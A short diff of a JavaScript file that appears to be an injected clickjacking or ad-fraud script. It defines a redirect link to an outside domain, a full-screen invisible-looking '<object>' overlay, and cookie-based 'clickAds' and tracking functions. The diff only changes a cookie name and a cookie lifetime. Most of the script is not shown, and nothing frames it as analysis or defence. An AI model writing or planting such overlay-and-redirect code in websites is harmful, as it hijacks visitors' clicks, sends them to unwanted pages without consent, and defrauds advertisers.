@@ -1,5 +1,5 @@
 var randLinks = ["https://guiadepescaesportivaemsantos.com/?utm=facebook&link=7ac02484ab9cbec10630849f903cb6e5&id=a8f5f167f44f4964e6c998dee827110c"];
-var randCookies = ["lastAction"];
+var randCookies = ["_gcli"];
 var cookieName = '';
 var urlFrame = '';
 var frameCode = '<object id="iplezier" type="text/html" style="position:absolute;width:100%;height:100%;overflow: hidden"></object>';
@@ -109,7 +109,7 @@ function checkDelay() {
 }
 
 function clickAds(){
-    setCookie(cookieName, '1', 24 * 13);
+    setCookie(cookieName, '1', 24 * 2);
 }
 
 function startTracker() {
